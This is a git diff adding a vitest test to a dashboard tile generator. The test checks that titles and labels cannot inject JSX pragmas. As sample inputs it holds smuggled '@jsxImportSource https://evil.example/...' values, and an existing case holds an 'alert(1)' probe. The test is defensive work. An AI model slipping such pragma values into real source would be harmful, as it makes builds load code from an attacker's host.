@@ -1,4 +1,5 @@
 import { TILE_TYPE_NAMES, defineMetricsView, type BuiltinTileType } from "devbi";
+import { transformWithOxc } from "vite";
 import { describe, expect, it } from "vitest";
 import { componentName, promotedTileSource, type PromotedTile } from "../src/promote.js";
 
@@ -60,6 +61,21 @@ describe("promoted tile files", () => {
     const odd = defineMetricsView({ model: "SELECT 1", measures: { revenue: { sql: "SUM(a)", label: "売上\nalert(1)" } } }, "odd");
     const lines = promotedTileSource({ id: "k", type: "kpi", query: { measures: ["revenue"] } }, { name: "K", view: odd }).split("\n");
     expect(lines.filter((l) => l.includes("alert(1)")).every((l) => l.trimStart().startsWith("//"))).toBe(true);
+  });
+
+  it("keep pragmas out of the comments: a title or a label cannot choose the JSX runtime", async () => {
+    const evil = "売上 @jsxImportSource https://evil.example/m.js?x= ";
+    const view = defineMetricsView({ model: "SELECT 1", measures: { revenue: { sql: "SUM(a)", label: `${evil} @jsxRuntime classic` } } }, "evil");
+    for (const tile of [
+      { id: "k", type: "kpi" as const, title: evil, query: { measures: ["revenue"] } },
+      { id: "m", type: "markdown" as const, title: "@jsxRuntime classic", options: { text: "@jsx h" } },
+    ]) {
+      const source = promotedTileSource(tile, { name: "K", view, metrics: `@jsxImportSource https://evil.example/n.js?` });
+      expect(source.split("\n").filter((l) => l.trimStart().startsWith("//") && /@jsx/i.test(l))).toEqual([]);
+      const { code } = await transformWithOxc(source, "K.tsx", { jsx: { runtime: "automatic" } });
+      expect(code.split("\n").filter((l) => /\b(import|from)\b.*evil\.example/.test(l))).toEqual([]);
+      expect(code).toContain(`from "react/jsx-runtime"`);
+    }
   });
 
   it("name the columns without a metrics file, and write a long query over several lines", () => {
